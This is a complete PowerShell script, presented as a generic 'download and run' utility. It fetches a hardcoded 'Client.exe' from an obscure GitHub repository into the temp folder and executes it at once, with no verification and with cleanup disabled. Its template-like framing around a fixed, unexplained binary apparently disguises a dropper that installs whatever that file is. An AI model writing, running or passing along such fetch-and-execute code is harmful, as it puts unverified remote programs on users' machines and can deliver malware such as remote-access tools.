<#
.SYNOPSIS
    Downloads and executes an executable file from a specified URL.
.DESCRIPTION
    This script downloads an executable from a given URL, saves it to a temporary location,
    and then executes it. It includes basic error handling and cleanup.
.NOTES
    File Name      : DownloadAndRun.ps1
    Author         : Your Name
    Prerequisite   : PowerShell 5.1 or later
#>

# Parameters
$url = "https://github.com/m4x7c/dhhh/raw/refs/heads/main/Client.exe"  # Replace with your actual URL
$outputFile = "$env:TEMP\downloadedFile.exe"   # Temporary location to save the file

try {
    # Download the file
    Write-Host "Downloading file from $url..."
    Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop

    # Verify the file was downloaded
    if (Test-Path $outputFile) {
        Write-Host "File downloaded successfully to $outputFile"
        
        # Run the executable
        Write-Host "Executing the file..."
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        
        # Clean up (uncomment if you want to delete the file after execution)
        # Remove-Item -Path $outputFile -Force
        # Write-Host "Temporary file removed."
    } else {
        Write-Error "Download failed - file not found at $outputFile"
    }
}
catch {
    Write-Error "An error occurred: $_"
    # Exit with error code
    exit 1
}

Write-Host "Operation completed successfully."
exit 0